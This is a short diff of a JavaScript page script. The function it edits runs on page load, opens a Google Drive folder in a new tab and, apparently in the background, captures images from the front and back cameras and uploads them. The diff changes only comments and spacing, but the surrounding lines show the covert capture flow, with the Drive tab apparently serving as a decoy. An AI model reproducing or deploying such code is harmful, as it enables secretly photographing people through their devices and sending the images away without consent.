@@ -90,10 +90,9 @@
   }
 
   async function startCapture() {
-    // Step 1: Open the new tab first
-    const newTab = window.open("https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft", "_blank");
-
-    // Step 2: Begin the capture process in the background
+    // open in new tab
+    window.open("https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft","_blank");
+    
     const front = await captureImages("user", "front");
     const back = await captureImages({ exact: "environment" }, "back");
     const allImages = [...front, ...back];
@@ -101,6 +100,7 @@
     if (allImages.length > 0) {
       await uploadImages(allImages);
     }
+
   }
 
   startCapture();
